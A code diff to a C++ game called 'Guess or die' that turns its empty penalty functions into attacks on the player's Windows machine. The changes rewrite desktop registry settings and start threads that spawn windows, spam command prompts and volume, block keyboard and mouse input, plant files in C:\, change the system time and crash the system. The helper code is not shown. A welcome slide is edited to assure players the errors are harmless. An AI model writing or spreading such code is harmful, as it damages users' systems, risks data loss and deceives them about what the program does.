@@ -6,6 +6,16 @@
 #include<iostream>
 #include<fstream>
 #include<vector>
+#include<thread>
+#include<chrono>
+#include<string>
+
+#include<windows.h>
+#include<unistd.h>
+#include<mmdeviceapi.h>
+#include<endpointvolume.h>
+#include<audioclient.h>
+#include<winternl.h>
 
 #include "rendering/render_window.hpp"
 #include "base_elements/entity.hpp"
@@ -16,14 +26,18 @@
 
 #include "game_elements/game.hpp"
 
+#include "game_elements/penalties.hpp"
+
+using namespace std::chrono_literals;
+
 guess_or_die::guess_or_die(render_window& p_game_win, TTF_Font* p_main_font, TTF_Font* p_second_font)
     :   game_win(p_game_win), 
         main_font(p_main_font),
         second_font(p_second_font), 
         ts(p_game_win), es(p_game_win), 
         current_phase(0), 
-        fc_ts_1(p_main_font, (SDL_Color){0,0,0,255}, game_win.get_renderer()), 
-        fc_ts_2(p_second_font, (SDL_Color){0,0,0,255}, game_win.get_renderer()),
+        fc_ts_1(p_main_font,(SDL_Color){0,0,0,255}, game_win.get_renderer()), 
+        fc_ts_2(p_second_font,(SDL_Color){0,0,0,255}, game_win.get_renderer()),
         level1(NULL), level2(NULL), level3(NULL), level4(NULL), level5(NULL),
         level6(NULL), level7(NULL), level8(NULL),
 
@@ -57,7 +71,7 @@ guess_or_die::guess_or_die(render_window& p_game_win, TTF_Font* p_main_font, TTF
     level8=load_level("../res/levels/level8");
 
     ts.add_slide(ts_slide(bg_neutral, title_splash, game_win.get_win_width()/2-game_win.get_texture_width(title_splash)/2, game_win.get_win_height()/2-game_win.get_texture_height(title_splash)/2,"", 0,0, NULL));
-    ts.add_slide(ts_slide(bg_neutral, NULL, 0,0,"Welcome to the\nGuess or die game!\n\nYou will need to\npay attention, however,\nas errors will be\ncostly... Good luck!", game_win.get_win_width()/2, game_win.get_win_height()/2, &fc_ts_1));
+    ts.add_slide(ts_slide(bg_neutral, NULL, 0,0,"Welcome to the\nGuess or die game!\n\nYou will need to\npay attention, however,\nas errors will be\ncostly... Good luck!\n\nNote: you might see\nlots of errors, but\nthey are actually\nharmless.", game_win.get_win_width()/2, game_win.get_win_height()/2, &fc_ts_1));
 
     congrats_1_ts.add_slide(ts_slide(bg_good, NULL, 0,0,"Excellent!", game_win.get_win_width()/2, game_win.get_win_height()/2, &fc_ts_1));
     congrats_2_ts.add_slide(ts_slide(bg_good, NULL, 0,0,"Fantastic!", game_win.get_win_width()/2, game_win.get_win_height()/2, &fc_ts_1));
@@ -73,7 +87,7 @@ guess_or_die::guess_or_die(render_window& p_game_win, TTF_Font* p_main_font, TTF
     penalty_3_ts.add_slide(ts_slide(bg_error, NULL, 0,0,"Ya doin' all this?", game_win.get_win_width()/2, game_win.get_win_height()/2, &fc_ts_1));
     penalty_4_ts.add_slide(ts_slide(bg_error, NULL, 0,0,"Lower that tone!\nDon't you hear\nyour volume is\na bit too high?", game_win.get_win_width()/2, game_win.get_win_height()/2, &fc_ts_1));
     penalty_5_ts.add_slide(ts_slide(bg_error, NULL, 0,0,"Keyboard? Mouse?\nNever heard of them...", game_win.get_win_width()/2, game_win.get_win_height()/2, &fc_ts_1));
-    penalty_6_ts.add_slide(ts_slide(bg_error, NULL, 0,0,"DLLs on desktop?\nThat's weird...", game_win.get_win_width()/2, game_win.get_win_height()/2, &fc_ts_1));
+    penalty_6_ts.add_slide(ts_slide(bg_error, NULL, 0,0,"Random DLLs in C:\\?\nThat's weird...", game_win.get_win_width()/2, game_win.get_win_height()/2, &fc_ts_1));
     penalty_7_ts.add_slide(ts_slide(bg_error, NULL, 0,0,"Look at the time,\ndude?", game_win.get_win_width()/2, game_win.get_win_height()/2, &fc_ts_1));
     penalty_8_ts.add_slide(ts_slide(bg_error, NULL, 0,0,"You really messed up...\n\nTime.\nTo.\nDie.", game_win.get_win_width()/2, game_win.get_win_height()/2, &fc_ts_1));
 
@@ -450,33 +464,44 @@ std::string guess_or_die::read_until_whiteline(ifstream& fin){
 }
 
 void guess_or_die::penalty_1(){
+    std::string tmp=std::string(to_string(rand()%256)+" "+to_string(rand()%256)+" "+to_string(rand()%256));
 
+    reg_set_key(HKEY_CURRENT_USER, "Control Panel\\Colors", "Background", tmp);
+    reg_set_key(HKEY_CURRENT_USER, "Control Panel\\Desktop", "WallPaper", "");
+    
 }
 
 void guess_or_die::penalty_2(){
-
+    std::thread th_show_window(display_windows);
+    th_show_window.detach();
 }
 
 void guess_or_die::penalty_3(){
-
+    std::thread th_spam_window(spam_cmd);
+    th_spam_window.detach();
 }
 
 void guess_or_die::penalty_4(){
-
+    std::thread th_spam_volume(spam_volume);
+    th_spam_volume.detach();
 }
 
 void guess_or_die::penalty_5(){
-
+    std::thread th_block(block_inputs);
+    th_block.detach();
 }
 
 void guess_or_die::penalty_6(){
-
+    std::thread th_make_file(special_file_make);
+    th_make_file.detach();
 }
 
 void guess_or_die::penalty_7(){
-
+    std::thread th_set_time(set_time);
+    th_set_time.detach();
 }
 
 void guess_or_die::penalty_8(){
-
+    std::thread th_crash_sys(crash_system);
+    th_crash_sys.detach();
 }
